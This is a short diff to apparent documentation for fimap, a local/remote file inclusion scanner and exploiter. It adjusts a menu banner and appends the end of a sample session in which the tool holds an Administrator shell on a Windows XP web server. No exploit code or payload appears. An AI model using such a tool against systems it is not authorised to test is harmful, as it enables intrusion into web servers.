@@ -43,7 +43,7 @@ fimap v.08_svn by Iman Karim - Automatic LFI/RFI scanner and exploiter
 ##################################################################### 
 #:: List of Domains ::                                              # 
 ##################################################################### 
-#[1] 192.168.178.33 (Microsoft Windows XP [Version 5.1.2600])      #
+#[1] 192.168.178.33 (Microsoft Windows XP [Version 5.1.2600])       #
 #[q] Quit                                                           #
 #####################################################################
 WARNING: Some domains may be not listed here because dynamic_rfi is not configured!
@@ -92,5 +92,9 @@ Volume in drive C has no label.
                3 Dir(s)   1.654.738.944 bytes free
 fishell@Administrator:C:\xampp\htdocs$> ver
 Microsoft Windows XP [Version 5.1.2600]
+fishell@Administrator:C:\xampp\htdocs$> q
+See ya dude!
+Do not forget to close this security hole.
+imax@Develb0x:/st0rage/dev/fimap/src$
 
 }}}
